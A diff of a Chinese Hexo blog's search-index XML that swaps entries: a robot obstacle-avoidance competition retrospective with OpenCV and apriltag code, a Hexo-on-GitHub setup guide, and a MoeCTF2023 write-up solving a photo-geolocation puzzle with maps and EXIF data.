-<p>而后我通过在幻尔科技的官方网站上进行查阅资料，发现在介绍中有着“标签识别”的功能。于是我预想通过重定义标签或是对预设标签进行替换，即将两边箭头的图像编辑成“标签”，通过对新“标签”的识别做出反应，从而达到方向识别的效果。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">detector = apriltag.Detector(searchpath=apriltag._get_demo_searchpath())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">apriltagDetect</span>(<span class="params">img</span>):  </span><br><span class="line"></span><br><span class="line">    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)</span><br><span class="line"></span><br><span class="line">    detections = detector.detect(gray, return_image=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(detections) != <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> detection <span class="keyword">in</span> detections:              </span><br><span class="line"></span><br><span class="line">            corners = np.rint(detection.corners)  <span class="comment"># 获取四个角点</span></span><br><span class="line"></span><br><span class="line">            cv2.drawContours(img, [np.array(corners, np.<span class="built_in">int</span>)], -<span class="number">1</span>, (<span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">            tag_family = <span class="built_in">str</span>(detection.tag_family, encoding=<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment"># 获取tag_family</span></span><br><span class="line"></span><br><span class="line">            tag_id = <span class="built_in">int</span>(detection.tag_id)  <span class="comment"># 获取tag_id</span></span><br><span class="line"></span><br><span class="line">            object_center_x, object_center_y = <span class="built_in">int</span>(detection.center[<span class="number">0</span>]), <span class="built_in">int</span>(detection.center[<span class="number">1</span>])  <span class="comment"># 中心点</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">tag_family, tag_id = apriltagDetect(img) <span class="comment"># apriltag检测</span></span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> tag_id <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line"></span><br><span class="line">        cv2.putText(img, <span class="string">&quot;tag_id: &quot;</span> + <span class="built_in">str</span>(tag_id), (<span class="number">10</span>, img.shape[<span class="number">0</span>] - <span class="number">30</span>), cv2.FONT_HERSHEY_SIMPLEX, <span class="number">0.65</span>, [<span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>], <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        cv2.putText(img, <span class="string">&quot;tag_family: &quot;</span> + tag_family, (<span class="number">10</span>, img.shape[<span class="number">0</span>] - <span class="number">10</span>), cv2.FONT_HERSHEY_SIMPLEX, <span class="number">0.65</span>, [<span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>], <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        cv2.putText(img, <span class="string">&quot;tag_id: None&quot;</span>, (<span class="number">10</span>, img.shape[<span class="number">0</span>] - <span class="number">30</span>), cv2.FONT_HERSHEY_SIMPLEX, <span class="number">0.65</span>, [<span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>], <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        cv2.putText(img, <span class="string">&quot;tag_family: None&quot;</span>, (<span class="number">10</span>, img.shape[<span class="number">0</span>] - <span class="number">10</span>), cv2.FONT_HERSHEY_SIMPLEX, <span class="number">0.65</span>, [<span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>], <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"> </span><br></pre></td></tr></table></figure>
-
-<p>经过对代码和机器人内部文件的查阅，我发现机器人的标签识别功能是建立在四个脚点的定位上，不具备对箭头等不规则图形的识别功能，同时机器人内部不存在标签相关的图像文件，难以对标签识别的代码与文件进行修改。故方案作废。</p>
-<p>然后我看到了面部识别的功能介绍和代码，我计划通过修改面部识别的文件，将“箭头”作为“面部”进行识别，但经对面部识别代码以及机器人内部文件的研究，发现机器人的面部识别功能是基于.d6a模型建立起来的。无法针对已经完善的模型文件进行修改，剩余的时间也不足以训练一个新的模型，故方案作废。</p>
-<p>至此，无论是剩余的时间还是任务分配都不允许我去设计其他新的思路去比赛，最终迫不得已基于思路一穷举出了可能的箭头情况并在比赛中分别调用，尽管我们及时发现并修补了机器人行动程序上的缺陷，但场地摩擦力不均带来的行动困难、机器人腿部舵机问题引起的不可控因素等场外条件将比赛算法不成熟引起的问题放大到了极致。因此很遗憾没有取得一个令人满意的成绩。</p>
-]]></content>
-      <categories>
-        <category>杂项</category>
-      </categories>
-      <tags>
-        <tag>复盘</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>利用hexo在github上搭建个人博客</title>
-    <url>/2023/08/15/%E5%88%A9%E7%94%A8hexo%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
-    <content><![CDATA[<p>由于厚米的服务器过期了，不好意思找他续费，于是决定自己搭一个blog，国内的要么广告多（X书），要么后台略显老旧（X园），几经挑选之后决定利用hexo在github上搭建。</p>
-<p>搭建的过程基本参考了<a href="https://www.cnblogs.com/huanhao/p/hexobase.html#%E9%85%8D%E7%BD%AE%E4%B8%BB%E9%A2%98">【基础篇】hexo博客搭建教程</a>。<br>但是可能是由于版本更新的问题，遇到了一些意料之外的情况。</p>
-<p>同时基于原本的教程增加了一些新功能并作此记录。</p>
-<ul>
-<li><input checked="" disabled="" type="checkbox"> 2023&#x2F;12&#x2F;1：记录了添加谷歌日历订阅的简易过程</li>
-<li><input checked="" disabled="" type="checkbox"> 2024&#x2F;4&#x2F;30 :  记录了修正hexo new生成页面需要手动修改类型(categorie -&gt; categories)的问题</li>
-</ul>
-<span id="more"></span>
-
-<h2 id="问题汇总"><a href="#问题汇总" class="headerlink" title="问题汇总"></a>问题汇总</h2><ol>
-<li>在git bash中执行安装cnpm出错<br>错误1：Error: EPERM: operation not permitted<br>解决方案：利用管理员模式打开git即可。<br>错误2：ERR! code EPERM<br>解决方案：将C:&#x2F;user&#x2F;用户名&#x2F;.npmrc删除（需要打开隐藏文件）。</li>
-<li>上传github时页面主题未显示<br>解决方案：分别在博客页面所在的文件夹执行hexo clean后再执行hexo g -d与 hexo d。（无法确认究竟是什么导致的问题，推测是缓存问题。）</li>
-<li>修改schemes后上传无效<br>删除themes&#x2F;next 中的.git（隐藏），再重新执行hexo g -d与 hexo d即可.</li>
-</ol>
-<p>另：由于github的项目规则更改，如果按照链接中的教程会将页面信息上传到项目的master分支中，此时只需将（根目录下的）页面配置文件中的branch项改成main即可。</p>
-<ol start="4">
-<li><p>图片插入无法显示</p>
-<p>图片根目录位于 &#x2F;博客名称&#x2F;themes&#x2F;主题名&#x2F;source&#x2F;images。即如果需要插入图片，需要引用的代码格式为 :<code>！[](./images/图片名(或者可以加入二级文件夹) ))</code></p>
-<p>可以用hexo s在本地页面中检查是否成功，同时本地页面可以动态调整。</p>
-</li>
-<li><p>新版hexo下文章创建无法分段</p>
-<p>需要在文章正文需要分段的地方自行添加 <code>&lt;!--more--&gt;</code></p>
-</li>
-</ol>
-<h2 id="增加谷歌日历订阅"><a href="#增加谷歌日历订阅" class="headerlink" title="增加谷歌日历订阅"></a>增加谷歌日历订阅</h2><details>
-<summary>展开</summary>
-
-<p>（以信息来源：<a href="https://www.ctfhub.com/#/calendar">CTFHub calendar</a>为例）</p>
-<ol>
-<li><p>打开主题内的_config.yml,找到calendar备用（\themes\next_config.yml）。<br><img src="/./images/%E5%88%A9%E7%94%A8hexo%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1701415622456.png" alt="1701415622456"></p>
-</li>
-<li><p>打开谷歌开发控制板 <code>https://console.cloud.google.com/apis/dashboard</code> ，创建一个新项目（名字随意，位置默认）。<br><img src="/./images/%E5%88%A9%E7%94%A8hexo%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1701416010725.png" alt="1701416010725"></p>
-</li>
-<li><p>在上方搜索框中搜索：Google calendar api.选择并启用。<br><img src="/./images/%E5%88%A9%E7%94%A8hexo%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1701415764731.png" alt="1701415764731"></p>
-</li>
-<li><p>打开OAuth consent screen，名称随意，User type选外部，邮箱填写自己的即可，范围勾选所有的Google calendar api。测试用户不用管，然后继续<br><img src="/./images/%E5%88%A9%E7%94%A8hexo%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1701416611080.png" alt="1701416611080"></p>
-</li>
-<li><p>打开凭据，选择创建凭据-api密钥，复制生成的密钥到_config.yml中的api_key里。<br><img src="/./images/%E5%88%A9%E7%94%A8hexo%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1701416630608.png" alt="1701416630608"><br>5.5. 如果有需要可以在api设置中add自己的网站为过滤条件，可以防止api被恶意使用（可选）<br><img src="/./images/%E5%88%A9%E7%94%A8hexo%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1701417104331.png" alt="1701417104331"></p>
-</li>
-<li><p>打开谷歌日历，打开设置-添加日历-通过网址添加<br><img src="/./images/%E5%88%A9%E7%94%A8hexo%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1701417220508.png" alt="1701417220508"></p>
-</li>
-<li><p>打开刚才添加的日历，找到集成日历，复制集成日历的日历ID。（如果添加的是自己的日历需要将日历设置为公开）<br><img src="/./images/%E5%88%A9%E7%94%A8hexo%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1701417310583.png" alt="1701417310583"></p>
-</li>
-<li><p>将日历id填入_config.yml。</p>
-<p><img src="/./images/%E5%88%A9%E7%94%A8hexo%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1714357303411.png" alt="1714357303411"></p>
-</li>
-<li><p>在网站根目录用命令 <code>hexo new page schedule</code>创建日程表页面。</p>
-</li>
-<li><p>修改刚刚创建的页面，添加 <code>type: scheldule</code>，可自定义修改名字。<br><img src="/./images/%E5%88%A9%E7%94%A8hexo%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1701417519112.png" alt="1701417519112"></p>
-</li>
-<li><p>启用menu中的schedule。<br><img src="/./images/%E5%88%A9%E7%94%A8hexo%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1701417720304.png" alt="1701417720304"></p>
-</li>
-<li><p>hexo s 在本地查看无误后分别执行 <code>hexo clean</code>和 <code>hexo g -d</code>推送。</p>
-</li>
-</ol>
-</details>
-
-<h2 id="修正hexo-new生成页面需要手动修改类型-categorie-categories-的问题"><a href="#修正hexo-new生成页面需要手动修改类型-categorie-categories-的问题" class="headerlink" title="修正hexo new生成页面需要手动修改类型(categorie -&gt; categories)的问题"></a>修正hexo new生成页面需要手动修改类型(categorie -&gt; categories)的问题</h2><details>
-<summary>展开</summary>
-
-<p>不确定是我个人的问题，还是hexo的普遍问题，此问题曾导致：使用 <code>hexo new</code>生成页面时，默认生成的页面里categories拼写错误，需要手动修改。<br><img src="/./images/%E5%88%A9%E7%94%A8hexo%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1714442743740.png" alt="1714442743740"><br><img src="/./images/%E5%88%A9%E7%94%A8hexo%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1714442805573.png" alt="1714442805573"><br>解决方案：进入 <code>.\%BLOG_NAME%\scaffolds</code>里修改自己使用的页面默认格式。<br><img src="/./images/%E5%88%A9%E7%94%A8hexo%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1714443016916.png" alt="1714443016916"><br>如果不确定自己使用的哪个页面，前往根目录的 <code>_config.yaml</code>里的 <code>default_layout</code>列查看</p>
-<p><img src="/./images/%E5%88%A9%E7%94%A8hexo%E5%9C%A8github%E4%B8%8A%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1714443180903.png" alt="1714443180903"></p>
-</details>
-]]></content>
-      <categories>
-        <category>杂项</category>
+        <category>信息安全</category>
       </categories>
       <tags>
         <tag>自学</tag>
@@ -298,6 +164,107 @@
       </categories>
       <tags>
         <tag>自学</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MoeCTF2023部分题目wp</title>
+    <url>/2023/09/20/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/</url>
+    <content><![CDATA[<p>比赛链接：<a href="https://ctf.xidian.edu.cn/">https://ctf.xidian.edu.cn/</a></p>
+<p>因为本人水平有限，并且部分题目是一边做一边记录，有错误在所难免，还请各位师傅多多批评指正。</p>
+<span id="more"></span>
+
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><details>
+
+<summary>http</summary>
+
+<p>使用工具：Burp</p>
+</details>
+
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><details>
+
+<summary>机位查询</summary>
+
+<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695552040696.png"></p>
+<p>使用工具：百度地图，高德地图；(exif)</p>
+<p>题干的安装包里有三个文件（1、2、3）。</p>
+<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695546103340.png"></p>
+<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695546153083.png"></p>
+<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695546160885.png"></p>
+<p>P1可以看到图片中有个很明显的南宁站，结合旁边的”高铁商务酒店”可以初步判断P1地址位于南宁高铁站附近</p>
+<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695546843704.png"></p>
+<p>然后根据地图与照片尝试反推位置：机位既能看到”猪霸王”所在的美食街，又能看到城市便捷酒店的远角以及南宁站的全貌。因此可以做一个大致的视线图如下。</p>
+<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695547408548.png"></p>
+<p>模拟图显示机位大概在”摩根快捷酒店”与”运德集团小区”附近，考虑到简易标点的误差，把”君安快捷酒店”作为备选项，选择用百度实景地图查看一下附近的具体信息。<img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695547590711.png"></p>
+<p>很显然，只有”嘉士摩根国际”这个建筑具备机位的相关条件，”运德集团小区”的建筑高度无法实现该效果，如果采取相同角度在”君安快捷酒店”拍照，”嘉士摩根国际”必然会出现在照片中。因此P1的flag片段为”jiashi”（注意平翘舌，别问我为什么）。</p>
+<p>P2有一个很明显的”中山路美食街”的特征，扔到bing搜索一下。<img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695548004807.png"></p>
+<p>又在南宁，顺手看一眼图片。</p>
+<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695548056397.png"></p>
+<p>看到一个类似的图片，点进去发现是素材库。判断这个图片可能是网图，开始百度识图。<img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695548274601.png"></p>
+<p>发现是某摄影比赛的作品，于是<del>找到主办方联系作者发邮件问照片是在哪拍的，</del> 打开百度地图搜索南宁中山路美食街</p>
+<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695548713876.png"></p>
+<p>根据”琉璃净”的位置确认具体方位。然后根据照片推断大致机位位置。（这里吐槽一下百度地图和高德地图一个不支持地图旋转，一个没有实景地图）</p>
+<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695548962411.png"></p>
+<p>根据上面比赛信息，可以排除在马路上使用无人机进行拍摄，所以只能是在”广西高等法院办公楼旧址”所在的区域，利用百度实景地图瞄一眼。</p>
+<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695549111309.png"></p>
+<p>显然，P2的flag片段为：baisheng</p>
+<p>P3比较麻烦，整个照片几乎没有有效的特征信息，只有最远处高楼有”广西农信”的字样，因此我猜测照片还是在南宁，在百度地图上尝试搜索”时代丽都”。</p>
+<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695549302124.png"></p>
+<p>运气很好。并且根据近大远小的透视关系。以及”时代丽都”和”中国人保大厦”的相对位置，可以很容易判断照片是从左往右拍摄的。照片下方有一串95500的电话，经过查询是太平洋保险的电话，由此向左寻找和太平洋相关的地标。</p>
+<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695549579432.png"></p>
+<p>初步判断是左边的”疫苗临床研究所”，查询全景地图。</p>
+<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695549812014.png"></p>
+<p>显然右边的黄色建筑（疾病预防控制中心）的高度不足以越过”太平洋世纪广场”所在的楼，所以还需要再重新定位。</p>
+<p>再往左看，发现最近同时具备能拍摄”太平洋世纪广场”并且高度明显远高于”太平洋世纪广场”的建筑仅可能有”铭湖经典”、”东方明珠花园”和”汇金苑”</p>
+<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695550053013.png"></p>
+<p>此时我发现了”中国人保”右边的字被挡住了，因此在通过实景地图查询中国人保标牌在建筑上的相对位置可以模拟一条较为精确的视线。</p>
+<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695550372881.png"></p>
+<p>大致为2&#x2F;3的位置。同时根据机位大概在”时代丽都”与”中国人保财险”的位置正中，并且”时代丽都”所在的区域背后有一条视角偏左的马路，可以模拟另一条视线图。同时照片是刚好只能看到”太平洋世纪广场”的电话的，所以可以做第三条视线图。</p>
+<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695551035234.png"></p>
+<p>受限于误差，仅仅排除了”铭湖经典”。并且不能判断究竟是”东方明珠花园”的前楼还是”东方明珠花园”与”汇金苑”的侧楼，然后我又仔细观察了一遍照片，发现有一个红色标识的楼位于机位的正中央。</p>
+<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695551258300.png"></p>
+<p>区域特征是旁边有一些红色的楼群，并且几乎都是高度较高的建筑，以及一个红色的不明logo，利用卫星地图确认了目标楼，并作了视线图，由于位于照片正中央，因此只需作平行线即可。</p>
+<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695551520367.png"></p>
+<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695551566402.png"></p>
+<p>然后再通过实景地图确认，”东方明珠花园”前楼的高度不足，因此P3的flag片段为”huijin”。</p>
+<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695551701456.png"></p>
+<p>最后，关于P3的这些各位读者其实都可以不看，因为我直到整理wp的时候才想起来把照片扔exif里查一下，里面写了经纬度……</p>
+<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695551823956.png"></p>
+<p><img src="/./images/MoeCTF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwp/1695551866254.png"></p>
+<p>哭了，我的头发，我对不起你。</p>
+</details>
+]]></content>
+      <tags>
+        <tag>复盘</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>机器人比赛避障项目赛后总结</title>
+    <url>/2023/08/15/%E6%9C%BA%E5%99%A8%E4%BA%BA%E6%AF%94%E8%B5%9B%E9%81%BF%E9%9A%9C%E9%A1%B9%E7%9B%AE%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<p>在见到避障比赛的文件之后，对比赛算法的设计并没有我想象中那么困难：机器人直行——机器人识别到箭头——机器人向箭头指向的方向平移——机器人视野脱离箭头——机器人直行，但是直觉与经验都在告诉我这个比赛最困难的地方就是在于怎么样才能去识别到三个箭头的方向。</p>
+<span id="more"></span>
+
+<p>首先我通过阅读材料以及代码，很容易便对颜色识别代码进行了改写，通过改写ColorDetect.py中113行—133行，实现了识别到红色和蓝色向左平移，识别到黄色向右平移。如未识别到颜色则直行。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> __isRunning:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> detect_color != <span class="string">&#x27;None&#x27;</span>:</span><br><span class="line"></span><br><span class="line">               AGC.runActionGroup(<span class="string">&#x27;go_forward_fast&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                action_finish = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> detect_color == <span class="string">&#x27;red&#x27;</span>:</span><br><span class="line"></span><br><span class="line">AGC.runActionGroup(<span class="string">&#x27;left_move&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                    detect_color = <span class="string">&#x27;None&#x27;</span></span><br><span class="line"></span><br><span class="line">                    draw_color = range_rgb[<span class="string">&quot;black&quot;</span>]           </span><br><span class="line"></span><br><span class="line">                    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">elif</span> detect_color == <span class="string">&#x27;yellow&#x27;</span>:</span><br><span class="line"></span><br><span class="line">AGC.runActionGroup(<span class="string">&#x27;right_move&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                    detect_color = <span class="string">&#x27;None&#x27;</span></span><br><span class="line"></span><br><span class="line">                    draw_color = range_rgb[<span class="string">&quot;black&quot;</span>]           </span><br><span class="line"></span><br><span class="line">                    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> detect_color == <span class="string">&#x27;blue&#x27;</span>:</span><br><span class="line"></span><br><span class="line">AGC.runActionGroup(<span class="string">&#x27;left_move&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                    detect_color = <span class="string">&#x27;None&#x27;</span></span><br><span class="line"></span><br><span class="line">                    draw_color = range_rgb[<span class="string">&quot;black&quot;</span>]           </span><br><span class="line"></span><br><span class="line">                    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">                    time.sleep(<span class="number">0.01</span>)       </span><br><span class="line"></span><br><span class="line">                action_finish = <span class="literal">True</span>       </span><br><span class="line"></span><br><span class="line">                detect_color = <span class="string">&#x27;None&#x27;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">               time.sleep(<span class="number">0.01</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            time.sleep(<span class="number">0.01</span>)</span><br></pre></td></tr></table></figure>
+
+<p>在实际测试中发现可能由于机器人腿部舵机或是场地摩擦力问题导致机器人并不能完全的达到平移效果，经过调整，将“平移”动作后加入一个“转体”动作即可修正平移产生的过度偏差。后续的工作便是在箭头识别设计成功之后，将颜色识别替换为箭头识别即可。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> detect_color == <span class="string">&#x27;red&#x27;</span>:</span><br><span class="line"></span><br><span class="line">AGC.runActionGroup(<span class="string">&#x27;left_move&#x27;</span>)</span><br><span class="line"></span><br><span class="line">AGC.runActionGroup(<span class="string">&#x27;turn_left_small_step&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                    detect_color = <span class="string">&#x27;None&#x27;</span></span><br><span class="line"></span><br><span class="line">                    draw_color = range_rgb[<span class="string">&quot;black&quot;</span>]   </span><br><span class="line"></span><br><span class="line">                    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">elif</span> detect_color == <span class="string">&#x27;yellow&#x27;</span>:</span><br><span class="line"></span><br><span class="line">AGC.runActionGroup(<span class="string">&#x27;right_move&#x27;</span>)</span><br><span class="line"></span><br><span class="line">AGC.runActionGroup(<span class="string">&#x27;turn_right_small_step&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                    detect_color = <span class="string">&#x27;None&#x27;</span></span><br><span class="line"></span><br><span class="line">                    draw_color = range_rgb[<span class="string">&quot;black&quot;</span>]   </span><br><span class="line"></span><br><span class="line">                    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<p>然后是对于箭头的识别的设计，我初步的思路是将标准箭头进行对半拆分，拆分成一个包含三角形的部分和只有矩形的部分，由于包含三角形的面积总是大于只有矩形的面积。因此可以把判断条件更改为“左右部分面积谁大”，即如果左半部分的面积更大则向左移动，右半部分的面积更大则向右移动。考虑到可能出现的图像处理问题，初步选择在lab空间中对图像进行处理。（下划线处为关键代码，下同）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lab_data:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> i != <span class="string">&#x27;black&#x27;</span> <span class="keyword">and</span> i != <span class="string">&#x27;white&#x27;</span>:</span><br><span class="line"></span><br><span class="line">                frame_mask = cv2.inRange(frame_lab,</span><br><span class="line"></span><br><span class="line">                                         (lab_data[i][<span class="string">&#x27;min&#x27;</span>][<span class="number">0</span>],</span><br><span class="line"></span><br><span class="line">                                          lab_data[i][<span class="string">&#x27;min&#x27;</span>][<span class="number">1</span>],</span><br><span class="line"></span><br><span class="line">                                          lab_data[i][<span class="string">&#x27;min&#x27;</span>][<span class="number">2</span>]),</span><br><span class="line"></span><br><span class="line">                                         (lab_data[i][<span class="string">&#x27;max&#x27;</span>][<span class="number">0</span>],</span><br><span class="line"></span><br><span class="line">                                          lab_data[i][<span class="string">&#x27;max&#x27;</span>][<span class="number">1</span>],</span><br><span class="line"></span><br><span class="line">                                          lab_data[i][<span class="string">&#x27;max&#x27;</span>][<span class="number">2</span>]))  <span class="comment">#对原图像和掩模进行位运算</span></span><br><span class="line"></span><br><span class="line">                eroded=cv2.erode(frame_mask,cv2.getStructuringElement(cv2.MORPH_RECT, (<span class="number">3</span>, <span class="number">3</span>)))  <span class="comment">#腐蚀</span></span><br><span class="line"></span><br><span class="line">dilated=cv2.dilate(eroded,cv2.getStructuringElement(cv2.MORPH_RECT, (<span class="number">3</span>, <span class="number">3</span>))) <span class="comment">#膨胀</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> debug:</span><br><span class="line"></span><br><span class="line">                cv2.imshow(i, dilated)</span><br><span class="line"></span><br><span class="line">contours=cv2.findContours(dilated,cv2.RETR_EXTERNAL,cv2.CHAIN_APPROX_NONE)[-<span class="number">2</span>]  <span class="comment">#找出轮廓</span></span><br><span class="line"></span><br><span class="line">                areaMaxContour, area_max = getAreaMaxContour(contours)  <span class="comment">#找出最大轮廓</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> areaMaxContour <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> area_max &gt; max_area:<span class="comment">#找最大面积</span></span><br><span class="line"></span><br><span class="line">                        max_area = area_max</span><br><span class="line"></span><br><span class="line">                        color_area_max = i</span><br><span class="line"></span><br><span class="line">                        areaMaxContour_max = areaMaxContour</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> max_area &gt; <span class="number">200</span>:  <span class="comment"># 有找到最大面积</span></span><br><span class="line"></span><br><span class="line">            ((centerX, centerY), radius) = cv2.minEnclosingCircle(areaMaxContour_max)  <span class="comment"># 获取最小外接圆</span></span><br><span class="line"></span><br><span class="line">            centerX = <span class="built_in">int</span>(Misc.<span class="built_in">map</span>(centerX, <span class="number">0</span>, size[<span class="number">0</span>], <span class="number">0</span>, img_w))</span><br><span class="line"></span><br><span class="line">            centerY = <span class="built_in">int</span>(Misc.<span class="built_in">map</span>(centerY, <span class="number">0</span>, size[<span 